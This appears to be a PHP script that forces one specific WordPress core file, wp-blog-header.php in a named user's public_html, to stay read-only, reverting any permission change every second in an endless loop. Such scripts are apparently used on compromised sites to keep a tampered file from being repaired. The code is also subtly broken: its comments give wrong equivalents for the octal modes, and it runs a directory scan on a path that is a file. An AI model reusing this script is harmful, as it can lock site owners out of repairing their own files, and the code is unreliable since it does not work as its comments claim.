<?php

// Define the directory to monitor
$directory = "/home/sangama/public_html/wp-blog-header.php";

// Define the desired permissions for directories and files
$directory_permissions = 0555; // Equivalent to drwxr-xr-x
$file_permissions = 0444; // Equivalent to -rw-r--r--

// Function to recursively change permissions of files and directories
function set_permissions($path, $directory_permissions, $file_permissions) {
    if (is_dir($path)) {
        // Change permissions for directory
        chmod($path, $directory_permissions);

        // Recursively change permissions for subdirectories and files
        $files = scandir($path);
        foreach ($files as $file) {
            if ($file != "." && $file != "..") {
                set_permissions($path . "/" . $file, $directory_permissions, $file_permissions);
            }
        }
    } else if (is_file($path)) {
        // Change permissions for file
        chmod($path, $file_permissions);
    }
}

// Set initial permissions for the directory
set_permissions($directory, $directory_permissions, $file_permissions);

// Monitor for changes in permissions
$previous_permissions = [];
while (true) {
    // Scan the directory for files and directories
    $files = scandir($directory);

    // Check if permissions have changed
    foreach ($files as $file) {
        if ($file != "." && $file != "..") {
            $path = $directory . "/" . $file;
            $current_permissions = fileperms($path);
            if (isset($previous_permissions[$path]) && $previous_permissions[$path] != $current_permissions) {
                // Permissions have changed, revert to original permissions
                if (is_dir($path)) {
                    chmod($path, $directory_permissions);
                } else if (is_file($path)) {
                    chmod($path, $file_permissions);
                }
            }
            $previous_permissions[$path] = $current_permissions;
        }
    }

    // Sleep for a short interval
    sleep(1);
}

?>
